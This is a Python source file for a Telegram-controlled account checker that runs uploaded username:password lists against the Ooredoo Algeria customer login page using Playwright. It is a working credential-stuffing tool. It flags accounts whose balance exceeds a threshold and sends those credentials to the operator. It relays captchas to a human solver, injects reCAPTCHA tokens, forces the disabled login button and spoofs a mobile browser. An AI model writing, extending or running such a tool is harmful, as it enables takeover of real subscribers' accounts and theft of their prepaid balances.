#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ooredoo Railway Bot
- Playwright browser
- Telegram interface
- Manual captcha solving via Telegram (sends screenshot)
"""

import os
import re
import sys
import time
import asyncio
import logging
from pathlib import Path

from dotenv import load_dotenv
from playwright.async_api import async_playwright
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes,
)
from telegram.request import HTTPXRequest

load_dotenv()

# ============================================================
#  ⚙️ الإعدادات
# ============================================================
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = int(os.getenv("TELEGRAM_CHAT_ID", "0"))
MIN_BALANCE = int(os.getenv("MIN_BALANCE", "100"))
HEADLESS = os.getenv("HEADLESS", "true").lower() == "true"
RETRY_DELAY = 3
MAX_RETRY = 10
CAPTCHA_TIMEOUT = 300  # 5 دقائق

SIGNIN_URL = "https://my.ooredoo.dz/sign-in"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
log = logging.getLogger("ooredoo")


# ============================================================
#  📊 الحالة
# ============================================================
state = {"running": False, "stop": False, "stats": None}
CAPTCHA_WAIT = {"future": None, "chat_id": None}


class Stats:
    def __init__(self):
        self.total = 0
        self.done = 0
        self.success = 0
        self.hit = 0
        self.no_balance = 0
        self.invalid = 0
        self.retries = 0
        self.captchas_solved = 0
        self.start_time = time.time()
        self.hits = []

    def elapsed(self):
        s = int(time.time() - self.start_time)
        h, m, s = s // 3600, (s % 3600) // 60, s % 60
        if h:
            return f"{h}h {m}m {s}s"
        if m:
            return f"{m}m {s}s"
        return f"{s}s"

    def summary(self):
        return (
            f"📊 <b>ملخص الفحص</b>\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"المجموع: <b>{self.total}</b>\n"
            f"تم: <b>{self.done}</b>\n"
            f"✅ نجح: <b>{self.success}</b>\n"
            f"💰 مؤهل: <b>{self.hit}</b>\n"
            f"⚠️ بلا رصيد: <b>{self.no_balance}</b>\n"
            f"❌ invalid: <b>{self.invalid}</b>\n"
            f"🔄 إعادات: <b>{self.retries}</b>\n"
            f"🧩 كابتشا: <b>{self.captchas_solved}</b>\n"
            f"⏱️ المدة: <b>{self.elapsed()}</b>"
        )

    def hits_text(self):
        if not self.hits:
            return "ما كاينش حسابات مؤهلة."
        lines = ["💰 <b>الحسابات المؤهلة:</b>", "━━━━━━━━━━━━━━━━━"]
        for i, (u, p, b) in enumerate(self.hits, 1):
            lines.append(f"<b>{i}.</b> <code>{u}:{p}</code> → <b>{b}</b> دج")
        return "\n".join(lines)


# ============================================================
#  🔧 Helpers
# ============================================================
def parse_accounts(text):
    out = []
    for line in text.split("\n"):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = re.split(r"[:\t;,]", line, maxsplit=1)
        if len(parts) < 2:
            continue
        user = parts[0].strip()
        pwd = parts[1].strip()
        if user and pwd:
            out.append((user, pwd))
    return out


def find_balance_in_text(text):
    if not text:
        return None
    pats = [
        r"(?:solde|balance|رصيد|الرصيد)\D{0,30}([\d]+[.,][\d]{1,2})",
        r"([\d]+[.,][\d]{1,2})\s*(?:DA|دج|DZD)",
    ]
    for p in pats:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            try:
                return float(m.group(1).replace(",", "."))
            except Exception:
                continue
    return None


def is_invalid_creds(text):
    if not text:
        return False
    t = text.lower()
    return any(p in t for p in [
        "identifiants non valides",
        "identifiants incorrects",
        "invalid user credentials",
        "invalid credentials",
        "mot de passe incorrect",
        "utilisateur non trouvé",
    ])


def is_retryable(text):
    if not text:
        return False
    t = text.lower()
    return any(p in t for p in [
        "معاودة", "يرجى معاودة", "عذرا", "عذراً",
        "réessayer", "veuillez réessayer",
        "try again", "please try",
        "temporary", "temporaire",
        "too many", "429",
        "server error", "timeout",
    ])


# ============================================================
#  🧩 كشف الكابتشا
# ============================================================
async def detect_captcha(page):
    # 1) صورة كابتشا
    for sel in [
        "img[src*='captcha' i]",
        "img[id*='captcha' i]",
        "img[alt*='captcha' i]",
    ]:
        try:
            loc = page.locator(sel).first
            if await loc.count() > 0 and await loc.is_visible():
                return {"type": "image", "locator": loc, "selector": sel}
        except Exception:
            continue

    # 2) input نصي
    for sel in [
        "input[name='ca']",
        "input[id='ca']",
        "input[name*='captcha' i]",
        "input[id*='captcha' i]",
    ]:
        try:
            loc = page.locator(sel).first
            if await loc.count() > 0 and await loc.is_visible():
                return {"type": "input", "locator": loc, "selector": sel}
        except Exception:
            continue

    # 3) reCAPTCHA v2
    try:
        v2 = page.locator("iframe[src*='google.com/recaptcha/api2/anchor']").first
        if await v2.count() > 0:
            box = await v2.bounding_box()
            if box and box["width"] > 0:
                site_key = await page.evaluate("""
                    () => {
                        const ifr = document.querySelector("iframe[src*='recaptcha/api2/anchor']");
                        if (!ifr) return null;
                        const m = ifr.src.match(/[?&]k=([^&]+)/);
                        return m ? m[1] : null;
                    }
                """)
                return {"type": "recaptcha_v2", "sitekey": site_key}
    except Exception:
        pass

    # 4) reCAPTCHA Enterprise (invisible)
    try:
        ent = await page.evaluate("""
            () => {
                const scripts = [...document.querySelectorAll('script[src]')];
                for (const s of scripts) {
                    const m = s.src.match(/[?&]render=([^&]+)/);
                    if (m && m[1] !== 'explicit') return m[1];
                }
                const html = document.documentElement.innerHTML;
                const m2 = html.match(/recaptcha\\/enterprise\\.js\\?render=([A-Za-z0-9_-]+)/);
                return m2 ? m2[1] : null;
            }
        """)
        if ent:
            return {"type": "recaptcha_enterprise", "sitekey": ent}
    except Exception:
        pass

    return None


async def ask_user_captcha(bot, chat_id, page, captcha_info):
    screenshot_path = "/tmp/captcha.png"
    try:
        if captcha_info["type"] == "image":
            await captcha_info["locator"].screenshot(path=screenshot_path)
        else:
            await page.screenshot(path=screenshot_path, full_page=False)
    except Exception:
        try:
            await page.screenshot(path=screenshot_path, full_page=False)
        except Exception:
            pass

    type_text = {
        "image": "📷 صورة كابتشا",
        "input": "⌨️ كابتشا نصية",
        "recaptcha_v2": "🔒 reCAPTCHA v2",
        "recaptcha_enterprise": "🔒 reCAPTCHA Enterprise",
    }.get(captcha_info["type"], "❓ كابتشا")

    caption = (
        f"🧩 <b>كابتشا مطلوبة!</b>\n"
        f"النوع: {type_text}\n"
    )
    if captcha_info.get("sitekey"):
        caption += f"Site Key: <code>{captcha_info['sitekey'][:35]}...</code>\n"
    caption += "\n<b>أرسل الحل هنا:</b>"

    try:
        with open(screenshot_path, "rb") as f:
            await bot.send_photo(
                chat_id=chat_id, photo=f,
                caption=caption, parse_mode="HTML",
            )
    except Exception as e:
        log.error("send_photo: %s", e)
        await bot.send_message(chat_id=chat_id, text=caption, parse_mode="HTML")

    loop = asyncio.get_event_loop()
    fut = loop.create_future()
    CAPTCHA_WAIT["future"] = fut
    CAPTCHA_WAIT["chat_id"] = chat_id

    try:
        solution = await asyncio.wait_for(fut, timeout=CAPTCHA_TIMEOUT)
    except asyncio.TimeoutError:
        await bot.send_message(chat_id=chat_id, text="⏰ ما ردّيتش. نتخطى.")
        return None
    finally:
        CAPTCHA_WAIT["future"] = None
        CAPTCHA_WAIT["chat_id"] = None

    return solution


async def apply_solution(page, captcha_info, solution):
    try:
        if captcha_info["type"] in ("image", "input"):
            loc = captcha_info["locator"]
            await loc.scroll_into_view_if_needed()
            try:
                await loc.click(force=True, timeout=3000)
            except Exception:
                pass
            try:
                await loc.fill("", force=True)
                await loc.press_sequentially(solution, delay=40)
                await loc.press("Tab")
            except Exception:
                await page.evaluate(
                    """
                    ({sel, val}) => {
                        const el = document.querySelector(sel);
                        if (!el) return;
                        el.focus();
                        const setter = Object.getOwnPropertyDescriptor(
                            window.HTMLInputElement.prototype, 'value'
                        ).set;
                        setter.call(el, val);
                        el.dispatchEvent(new Event('input', {bubbles: true}));
                        el.dispatchEvent(new Event('change', {bubbles: true}));
                    }
                    """,
                    {"sel": captcha_info["selector"], "val": solution},
                )
            return True

        if captcha_info["type"] in ("recaptcha_v2", "recaptcha_enterprise"):
            await page.evaluate(
                """
                (t) => {
                    let ta = document.querySelector(
                        "textarea[name='g-recaptcha-response'], #g-recaptcha-response"
                    );
                    if (!ta) {
                        ta = document.createElement('textarea');
                        ta.name = 'g-recaptcha-response';
                        ta.id = 'g-recaptcha-response';
                        ta.style.display = 'none';
                        document.body.appendChild(ta);
                    }
                    ta.value = t;
                    ta.dispatchEvent(new Event('input', {bubbles: true}));
                    ta.dispatchEvent(new Event('change', {bubbles: true}));
                }
                """,
                solution,
            )
            try:
                await page.evaluate(
                    """
                    (t) => {
                        if (window.___grecaptcha_cfg) {
                            const clients = window.___grecaptcha_cfg.clients || {};
                            for (const id in clients) {
                                const c = clients[id];
                                if (c && c.callback) {
                                    try { c.callback(t); } catch(e) {}
                                }
                            }
                        }
                    }
                    """,
                    solution,
                )
            except Exception:
                pass
            return True
    except Exception as e:
        log.error("apply_solution: %s", e)
    return False


# ============================================================
#  🌐 Page helpers
# ============================================================
async def hide_overlays(page):
    try:
        await page.evaluate("""
            () => {
                const sels = ['.swiper', '.swiper-wrapper', '.grecaptcha-badge'];
                for (const s of sels) {
                    document.querySelectorAll(s).forEach(el => {
                        el.style.display = 'none';
                        el.style.pointerEvents = 'none';
                    });
                }
            }
        """)
    except Exception:
        pass


async def fill_username(page, username):
    try:
        return bool(await page.evaluate("""
            (val) => {
                const labels = [...document.querySelectorAll('label, .v-label, p')];
                let target = null;
                for (const l of labels) {
                    if (/nom d'utilisateur/i.test(l.textContent || '')) {
                        let n = l.parentElement;
                        for (let i = 0; i < 5 && n; i++) {
                            const inp = n.querySelector('input:not([type=password]):not([type=hidden])');
                            if (inp) { target = inp; break; }
                            n = n.parentElement;
                        }
                        if (target) break;
                    }
                }
                if (!target) {
                    const inputs = [...document.querySelectorAll('input')].filter(i => {
                        const t = i.type || 'text';
                        return t !== 'password' && t !== 'hidden' && i.offsetParent !== null;
                    });
                    if (inputs.length) target = inputs[0];
                }
                if (!target) return false;
                target.focus();
                const setter = Object.getOwnPropertyDescriptor(
                    window.HTMLInputElement.prototype, 'value'
                ).set;
                setter.call(target, val);
                target.dispatchEvent(new Event('input', {bubbles: true}));
                target.dispatchEvent(new Event('change', {bubbles: true}));
                target.dispatchEvent(new Event('blur', {bubbles: true}));
                return true;
            }
        """, username))
    except Exception:
        return False


async def fill_password(page, password):
    try:
        return bool(await page.evaluate("""
            (val) => {
                const pwd = document.querySelector('input[type=password]');
                if (!pwd) return false;
                pwd.focus();
                const setter = Object.getOwnPropertyDescriptor(
                    window.HTMLInputElement.prototype, 'value'
                ).set;
                setter.call(pwd, val);
                pwd.dispatchEvent(new Event('input', {bubbles: true}));
                pwd.dispatchEvent(new Event('change', {bubbles: true}));
                pwd.dispatchEvent(new Event('blur', {bubbles: true}));
                return true;
            }
        """, password))
    except Exception:
        return False


async def click_connexion(page):
    try:
        return bool(await page.evaluate("""
            () => {
                const btns = [...document.querySelectorAll('button')];
                const t = btns.find(b => /connexion|se connecter/i.test(b.textContent || ''));
                if (!t) return false;
                t.removeAttribute('disabled');
                t.click();
                return true;
            }
        """))
    except Exception:
        return False


async def find_error(page):
    try:
        body = await page.inner_text("body")
    except Exception:
        body = ""
    pats = [
        r"(identifiants?\s+incorrect[s]?[^\n]{0,80})",
        r"(mot de passe\s+incorrect[^\n]{0,80})",
        r"(Identifiants non valides[^\n]{0,80})",
        r"(Invalid User Credentials[^\n]{0,80})",
        r"(erreur[^\n]{0,100})",
        r"(échec[^\n]{0,80})",
        r"(عذرا[^\n]{0,120}معاودة[^\n]{0,120})",
        r"(يرجى معاودة[^\n]{0,120})",
        r"(veuillez\s+réessayer[^\n]{0,120})",
    ]
    for p in pats:
        m = re.search(p, body, re.IGNORECASE)
        if m:
            return m.group(1).strip()
    return None


async def is_logged_in(page):
    try:
        if "/sign-in" in page.url or "/login" in page.url:
            if await page.locator("input[type='password']").count() > 0:
                return False
        return True
    except Exception:
        return False


# ============================================================
#  🎯 محاولة حساب
# ============================================================
async def try_account(browser, user, pwd, bot, chat_id):
    ctx = await browser.new_context(
        locale="fr-FR",
        viewport={"width": 412, "height": 915},
        user_agent=("Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36"),
    )
    page = await ctx.new_page()

    try:
        await page.goto(SIGNIN_URL, wait_until="domcontentloaded", timeout=60000)
        await page.wait_for_timeout(4000)
        await hide_overlays(page)

        if not await fill_username(page, user):
            await ctx.close()
            return {"status": "retry"}

        if not await fill_password(page, pwd):
            await ctx.close()
            return {"status": "retry"}

        await page.wait_for_timeout(300)

        # 🧩 نتحقق من الكابتشا
        captcha_info = await detect_captcha(page)

        if captcha_info:
            log.info("Captcha detected: %s", captcha_info["type"])
            state["stats"].captchas_solved += 1

            solution = await ask_user_captcha(bot, chat_id, page, captcha_info)

            if not solution:
                await ctx.close()
                return {"status": "retry", "msg": "user didn't answer captcha"}

            ok = await apply_solution(page, captcha_info, solution)
            if not ok:
                await bot.send_message(
                    chat_id=chat_id,
                    text="⚠️ ما قدرناش نحطو الحل. نعاودو...",
                )
                await ctx.close()
                return {"status": "retry"}

            await bot.send_message(
                chat_id=chat_id,
                text=f"✅ توصلنا بالحل: <code>{solution[:50]}</code>",
                parse_mode="HTML",
            )
            await page.wait_for_timeout(500)
        else:
            log.info("No captcha detected")

        # نضغطو Connexion
        if not await click_connexion(page):
            await ctx.close()
            return {"status": "retry"}

        # نستنو النتيجة
        start = time.time()
        while time.time() - start < 30:
            if await is_logged_in(page):
                await page.wait_for_timeout(1500)
                body = await page.inner_text("body")
                bal = find_balance_in_text(body)
                await ctx.close()
                return {"status": "success", "balance": bal}

            err = await find_error(page)
            if err:
                if is_invalid_creds(err):
                    await ctx.close()
                    return {"status": "invalid", "msg": err}
                if is_retryable(err):
                    await ctx.close()
                    return {"status": "retry", "msg": err}

            await page.wait_for_timeout(500)

        await ctx.close()
        return {"status": "retry", "msg": "timeout"}

    except Exception as e:
        log.exception("try_account error")
        try:
            await ctx.close()
        except Exception:
            pass
        return {"status": "retry", "msg": str(e)}


# ============================================================
#  🚀 الفحص
# ============================================================
async def run_check(app, chat_id, accounts):
    stats = Stats()
    stats.total = len(accounts)
    state["stats"] = stats
    bot = app.bot

    await bot.send_message(
        chat_id=chat_id,
        text=(
            f"🚀 <b>بداية الفحص</b>\n"
            f"عدد: <b>{len(accounts)}</b>\n"
            f"الحد: <b>{MIN_BALANCE}</b> دج\n"
            f"🧩 الكابتشا: يدوياً عبر Telegram\n"
            f"/stop للإيقاف."
        ),
        parse_mode="HTML",
    )

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=HEADLESS,
            args=[
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
            ],
        )
        try:
            last_update = time.time()
            for idx, (user, pwd) in enumerate(accounts, 1):
                if state["stop"]:
                    await bot.send_message(chat_id=chat_id, text="⏹️ تم الإيقاف.")
                    break

                attempts = 0
                while attempts < MAX_RETRY:
                    attempts += 1
                    if state["stop"]:
                        break

                    try:
                        r = await try_account(browser, user, pwd, bot, chat_id)
                    except Exception:
                        log.exception("account failed")
                        r = {"status": "retry"}

                    if r["status"] == "success":
                        stats.success += 1
                        bal = r.get("balance")
                        if bal is None:
                            stats.no_balance += 1
                        elif bal >= MIN_BALANCE:
                            stats.hit += 1
                            stats.hits.append((user, pwd, bal))
                            await bot.send_message(
                                chat_id=chat_id,
                                text=(
                                    f"💰 <b>حساب مؤهل!</b>\n"
                                    f"👤 <code>{user}</code>\n"
                                    f"🔑 <code>{pwd}</code>\n"
                                    f"💵 <b>{bal}</b> دج"
                                ),
                                parse_mode="HTML",
                            )
                        break

                    if r["status"] == "invalid":
                        stats.invalid += 1
                        break

                    stats.retries += 1
                    await asyncio.sleep(RETRY_DELAY)

                stats.done += 1

                if time.time() - last_update > 15:
                    try:
                        await bot.send_message(
                            chat_id=chat_id,
                            text=(
                                f"⏳ <b>تقدم</b> {idx}/{len(accounts)}\n"
                                f"✅ {stats.success} | 💰 {stats.hit} | "
                                f"❌ {stats.invalid} | 🧩 {stats.captchas_solved}"
                            ),
                            parse_mode="HTML",
                        )
                    except Exception:
                        pass
                    last_update = time.time()

        finally:
            await browser.close()

    try:
        await bot.send_message(chat_id=chat_id, text=stats.summary(), parse_mode="HTML")
        if stats.hits:
            await bot.send_message(chat_id=chat_id, text=stats.hits_text(), parse_mode="HTML")
    except Exception:
        pass

    state["running"] = False
    state["stop"] = False


# ============================================================
#  🤖 Handlers
# ============================================================
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🚀 <b>بوت Ooredoo Railway</b>\n\n"
        "ابعتلي ملف <code>accounts.txt</code>:\n"
        "<code>0553372434:password</code>\n\n"
        "🧩 إذا طلعت كابتشا، غادي نبعتلك صورة ونستنى الحل منك.\n\n"
        "/start /status /stop",
        parse_mode="HTML",
    )


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if state["running"]:
        s = state["stats"]
        await update.message.reply_text(
            f"⏳ <b>جاري...</b>\n"
            f"تم: {s.done}/{s.total}\n"
            f"✅ {s.success} | 💰 {s.hit} | ❌ {s.invalid} | 🧩 {s.captchas_solved}",
            parse_mode="HTML",
        )
    else:
        await update.message.reply_text("✅ جاهز. ابعتلي ملف.")


async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    state["stop"] = True
    await update.message.reply_text("⏹️ جاري الإيقاف...")
    # إذا كاين انتظار كابتشا، نلغيه
    if CAPTCHA_WAIT["future"] and not CAPTCHA_WAIT["future"].done():
        CAPTCHA_WAIT["future"].cancel()


async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != TELEGRAM_CHAT_ID:
        return
    if state["running"]:
        await update.message.reply_text("⚠️ فحص جاري. /stop أولاً.")
        return

    doc = update.message.document
    if not doc:
        return

    file = await ctx.bot.get_file(doc.file_id)
    data = await file.download_as_bytearray()
    text = data.decode("utf-8", errors="ignore")
    accounts = parse_accounts(text)

    if not accounts:
        await update.message.reply_text(
            "❌ الملف فارغ أو الصيغة غالطة.", parse_mode="HTML",
        )
        return

    state["running"] = True
    state["stop"] = False

    await update.message.reply_text(
        f"📄 توصلت بـ <b>{len(accounts)}</b> حساب\n"
        f"🧩 الكابتشا: نحلها يدوياً\n"
        f"نبداو...",
        parse_mode="HTML",
    )
    asyncio.create_task(run_check(ctx.application, update.effective_chat.id, accounts))


async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != TELEGRAM_CHAT_ID:
        return

    text = update.message.text.strip()

    # ✅ إذا كاين انتظار كابتشا
    if CAPTCHA_WAIT["future"] and not CAPTCHA_WAIT["future"].done():
        CAPTCHA_WAIT["future"].set_result(text)
        await update.message.reply_text(
            f"✅ توصلت بالحل: <code>{text[:60]}</code>",
            parse_mode="HTML",
        )
        return

    if text.startswith("/"):
        return

    accounts = parse_accounts(text)
    if accounts:
        if state["running"]:
            await update.message.reply_text("⚠️ فحص جاري.")
            return
        state["running"] = True
        state["stop"] = False
        await update.message.reply_text(
            f"📄 <b>{len(accounts)}</b> حساب. نبداو...",
            parse_mode="HTML",
        )
        asyncio.create_task(run_check(ctx.application, update.effective_chat.id, accounts))
    else:
        await update.message.reply_text("💡 ابعتلي ملف أو الصق الحسابات.")


# ============================================================
#  Main
# ============================================================
def main():
    print("🚀 Ooredoo Railway Bot starting...")
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        raise Exception("TELEGRAM_TOKEN أو TELEGRAM_CHAT_ID ناقصين")

    request = HTTPXRequest(
        connection_pool_size=8,
        connect_timeout=30.0,
        read_timeout=30.0,
        write_timeout=30.0,
        pool_timeout=30.0,
    )

    app = (
        Application.builder()
        .token(TELEGRAM_TOKEN)
        .request(request)
        .get_updates_request(request)
        .build()
    )

    async def on_error(update, context):
        log.error("Handler error: %s", context.error)

    app.add_error_handler(on_error)
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("✅ Bot running")
    app.run_polling(allowed_updates=Update.ALL_TYPES, poll_interval=2.0, timeout=30)


if __name__ == "__main__":
    main()
